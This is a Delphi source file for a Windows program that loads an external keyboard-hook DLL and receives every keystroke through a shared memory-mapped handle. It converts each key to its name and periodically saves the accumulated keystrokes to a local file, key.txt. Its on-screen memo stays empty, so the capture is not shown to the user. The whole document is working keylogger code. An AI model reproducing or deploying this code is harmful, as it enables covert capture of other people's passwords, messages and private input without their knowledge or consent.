unit ufrmMain;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls;

const
  WM_HOOKKEY = WM_USER + $1000;
  HookDLL = 'Key.dll';

type
  THookProcedure = procedure; stdcall;

  TfrmMain = class(TForm)
    Memo1: TMemo;
    tmrMain: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure tmrMainTimer(Sender: TObject);
  private
    { Private declarations }
    FLog: TStringBuilder;
    FileMapHandle: THandle;
    PMem: ^Integer;
    HandleDLL: THandle;
    HookOn, HookOff: THookProcedure;
    FiRow: Integer;
    procedure HookKey(var message: TMessage); message WM_HOOKKEY;
  public
    { Public declarations }
  end;

var
  frmMain: TfrmMain;

implementation
{$R *.DFM}

procedure TfrmMain.FormCreate(Sender: TObject);
begin
  Memo1.ReadOnly := TRUE;
  Memo1.Clear;
  HandleDLL := LoadLibrary(PChar(ExtractFilePath(Application.Exename) + HookDll));
  if HandleDLL = 0 then
    raise Exception.Create('未发现键盘钩子DLL');
  @HookOn := GetProcAddress(HandleDLL, 'HookOn');
  @HookOff := GetProcAddress(HandleDLL, 'HookOff');
  if not assigned(HookOn) or not assigned(HookOff) then
    raise Exception.Create('在给定的 DLL中' + #13 + '未发现所需的函数');

  FileMapHandle := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(Integer),
    'TestHook');

  if FileMapHandle = 0 then
    raise Exception.Create('创建内存映射文件时出错');
  PMem := MapViewOfFile(FileMapHandle, FILE_MAP_WRITE, 0, 0, 0);
  PMem^ := Handle;
  HookOn;
  FLog := TStringBuilder.Create;
end;

procedure TfrmMain.HookKey(var message: TMessage);
var
  KeyName: array[0..100] of char;
  sKeyName: string;
begin
  GetKeyNameText(message.LParam, @KeyName, 100);
  sKeyName := string(KeyName)+' ';
  if ((message.lParam shr 31) and 1) = 1 then
    FLog.Append(sKeyName);
end;

procedure TfrmMain.FormDestroy(Sender: TObject);
begin
  if Assigned(HookOff) then
    HookOff;
  if HandleDLL <> 0 then
    FreeLibrary(HandleDLL);
  if FileMapHandle <> 0 then
  begin
    UnmapViewOfFile(PMem);
    CloseHandle(FileMapHandle);
  end;
end;

procedure TfrmMain.tmrMainTimer(Sender: TObject);
begin
  FLog.AppendLine();
  with TStringList.Create do
  try
    Text := FLog.ToString;
    SaveToFile('key.txt');
  finally
    Free;
  end;
end;

end.

